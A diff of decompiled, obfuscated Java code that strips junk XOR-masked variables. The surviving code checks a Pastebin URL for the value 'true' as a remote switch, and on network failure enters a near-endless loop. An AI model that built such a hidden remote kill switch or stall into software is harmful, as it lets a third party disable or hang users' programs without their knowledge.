@@ -36,17 +36,9 @@ public class hht {
       int[] ax = dar.abu();
 
       try {
-         short var16 = 3920;
-         long var10003 = 2629019145812217023L ^ a;
          HttpURLConnection axx = (HttpURLConnection)new URL("https://pastebin.com/raw/G6DvJjqY").openConnection();
-         short var12 = 26063;
-         long var17 = 5548790900966942241L ^ a;
          axx.setRequestMethod("GET");
-         var12 = 16510;
-         long var18 = 603376952221061919L ^ a;
          axx.setConnectTimeout(3000);
-         var12 = 1632;
-         long var19 = 4597088537965008128L ^ a;
          axx.setReadTimeout(3000);
          BufferedReader axxx = new BufferedReader(new InputStreamReader(axx.getInputStream()));
          StringBuilder axxxx = new StringBuilder();
@@ -66,17 +58,11 @@ public class hht {
          }
 
          String var10 = axxxx.toString();
-         var12 = 5116;
-         long var20 = 8609386961484714001L ^ a;
          return var10.equalsIgnoreCase("true");
       } catch (Exception var7) {
-         short var10000 = 7058;
-         long var10001 = 6171550226314359747L ^ a;
          long axx = Long.MIN_VALUE;
 
          do {
-            short var11 = 5052;
-            long var10002 = 8869761197248805868L ^ a;
             if (axx >= Long.MAX_VALUE) {
                break;
             }
@@ -175,7 +161,6 @@ public class hht {
                   | (var21[5] & 255L) << 16
                   | (var21[6] & 255L) << 8
                   | var21[7] & 255L;
-               byte var46 = -1;
                var17[var10001] = var10004;
             } while (var13 < var16);
 
@@ -231,7 +216,6 @@ public class hht {
                   | (var10[5] & 255L) << 16
                   | (var10[6] & 255L) << 8
                   | var10[7] & 255L;
-               byte var48 = -1;
                var6[var39] = var49;
             } while (var2 < var5);
 
